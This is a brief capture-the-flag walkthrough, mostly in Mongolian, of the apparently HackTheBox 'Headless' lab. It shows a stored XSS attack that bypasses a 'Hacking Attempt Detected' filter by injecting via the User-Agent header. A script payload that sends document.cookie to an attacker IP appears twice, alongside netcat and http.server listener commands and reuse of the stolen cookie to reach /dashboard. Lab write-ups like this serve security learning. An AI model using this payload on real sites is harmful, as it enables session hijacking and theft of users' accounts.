# Headless - XSS Steal Cookie

## Lets Exploit XSS Cookie steal using Dom Based.

Дараах аргыг ашиглан Cookie хулгайлах техникийг хэрэгжүүлж байна.

Reference: https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e

1. **Classic way**

```html
<script>var i=new Image(); i.src="http://10.10.14.8/?cookie="+btoa(document.cookie);</script>
```

```bash
python3 -m http.server -m 80
```

[image]

http://victim:5000/example — Тэгэхээр 5000 порт дээр веб сервер дээр дараах contact form ажиллаж байна.

[image]

http://victim:5000/dashboard — Internal Server Error заасан байдалтай байна.

[image]

## Lets pentest!

**/support url-д эмзэг байдлын шалгалт хийж байгаа бөгөөд message хэсэгт XSS халдлагын payload оруулвал response-т Hacking Attempt Detected гэсэн хариу ирнэ.**

[image]

**Response:** Hacking Attempt Detected

[image]

## Cookie хулгайлах

User-agent болон message хэсэг дээр дараах мөрийг оруулж өгөх.

```html
<script>var i=new Image(); i.src="http://10.10.14.8/?cookie="+btoa(document.cookie);</script>
```

[image]

```bash
nc -lvp 8001
```

[image]

**Cookie-г амжилттай сонссон тул одоо бид тухайн cookie-гээр /dashboard руу хандаж орно.**

**Forward -->**

[image]

## Success

[embedded content]
